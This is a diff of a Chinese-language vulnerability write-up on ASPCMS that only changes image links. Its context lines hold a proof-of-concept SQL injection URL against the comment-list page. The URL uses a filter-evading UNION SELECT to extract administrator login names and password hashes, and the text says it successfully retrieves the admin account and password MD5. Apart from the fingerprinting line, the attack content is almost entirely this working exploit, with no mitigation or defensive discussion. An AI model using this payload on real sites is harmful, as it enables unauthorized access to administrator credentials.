@@ -20,7 +20,7 @@ app="ASPCMS"
 
 通过网站源码响应判断CMS
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170904613.png)
+![img](./images/202202170904613.png)
 
 验证POC
 
@@ -28,6 +28,6 @@ app="ASPCMS"
 /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
 ```
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170904678.png)
+![img](./images/202202170904678.png)
 
 成功获取管理员账号以及密码的MD5
